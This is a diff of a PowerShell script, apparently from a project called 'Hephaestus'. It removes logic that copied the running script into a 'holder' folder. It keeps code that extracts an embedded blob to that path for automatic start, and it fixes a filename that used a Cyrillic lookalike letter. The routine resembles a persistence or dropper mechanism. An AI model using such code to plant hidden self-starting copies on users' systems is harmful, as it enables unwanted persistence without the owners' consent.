@@ -1,27 +1,6 @@
 . ./utils.ps1
 . ./consts_body.ps1
-. ./consts_autoсopy.ps1
-
-function GlobalScriptPath {
-    $globalScriptPath =  $PSCommandPath
-    if ([string]::IsNullOrEmpty($globalScriptPath))
-    {
-        $globalScriptPath = $MyInvocation.MyCommand.Path
-    }
-    if ([string]::IsNullOrEmpty($globalScriptPath))
-    {
-        $globalScriptPath = $MyInvocation.MyCommand.Path
-    }
-    if ([string]::IsNullOrEmpty($globalScriptPath))
-    {
-        $globalScriptPath = $MyInvocation.MyCommand.Definition
-    }
-    if ([string]::IsNullOrEmpty($globalScriptPath))
-    {
-        $globalScriptPath = $MyInvocation.MyCommand.Source
-    }
-    return $globalScriptPath
-}
+. ./consts_autocopy.ps1
 
 
 function do_autocopy {
@@ -30,20 +9,13 @@ function do_autocopy {
     {
         return
     }
-    function Is-HolderScript { param ([string]$curPath)
-
-        $holderPath = Get-HolderPath
-        return $curPath -eq $holderPath
-    }
 
     try 
     {
         $holderPath = Get-HolderPath
         $holderFolder = Get-HephaestusFolder  
-        $currentScriptPath = GlobalScriptPath
-  
-        $isAuto = Is-HolderScript -curPath $currentScriptPath
-        if ($server.autoStart -eq $false -or $isAuto -eq $true)
+
+        if ($server.autoStart -eq $false)
         {
             return
         }
@@ -51,31 +23,14 @@ function do_autocopy {
         if (-not (Test-Path $holderFolder)) {
             New-Item -Path $holderFolder -ItemType Directory | Out-Null
         }
-        writedbg "currentScriptPath: $currentScriptPath"
-        writedbg "isAuto: $isAuto"
-
 
         if ($null -ne $global:xholder -and $global:xholder -ne "")
         {
-            writedbg "Invoke from internals: $currentScriptPath"
+            writedbg "Invoke from internals"
             ExtractEmbedding -inContent $xholder -outFile $holderPath
             return
         }
 
-
-        if (-not $currentScriptPath) {
-            writedbg "This is not being run from a script file." -ForegroundColor Yellow
-            return
-        }
-
-
-        try {
-            Copy-Item -Path $currentScriptPath -Destination $holderPath -Force
-            writedbg "Script successfully copied to: $holderPath"
-        } catch {
-            writedbg "Error copying script to Hephaestus path: $($_.Exception.Message)" -ForegroundColor Red
-        }
-    
     } catch {
         writedbg "Error DoAuto"
     }
